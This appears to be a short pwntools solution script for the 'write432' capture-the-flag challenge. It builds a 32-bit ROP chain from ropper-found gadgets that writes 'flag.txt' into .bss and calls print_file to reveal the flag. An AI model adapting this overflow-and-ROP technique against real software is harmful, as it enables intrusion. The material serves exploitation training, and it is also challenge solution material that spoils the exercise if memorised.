from pwn import *

DEBUG = False

elf = ELF("./write432")
gs = """
b *pwnme+177
b *print_file
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_edi_pop_ebp = 0x080485aa   # pop edi; pop ebp; ret;
mov_memo_edi_ebp = 0x08048543  # mov dword ptr [edi], ebp; ret;

bytes_str = b"flag.txt\0"
write_loc = 0x0804a020  # .bss
offset = 44
payload = cyclic(offset)

chunk_size = 4  # 32 bits = 4 bytes per write.
for i in range(0, len(bytes_str), chunk_size):
    payload += p32(pop_edi_pop_ebp) + p32(write_loc + i)
    payload += bytes_str[i: i+chunk_size].ljust(chunk_size, b'\0') + p32(mov_memo_edi_ebp)

payload += p32(elf.sym.print_file) + b'AAAA' + p32(write_loc)

io.sendline(payload)
io.wait()  # for debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv().decode())
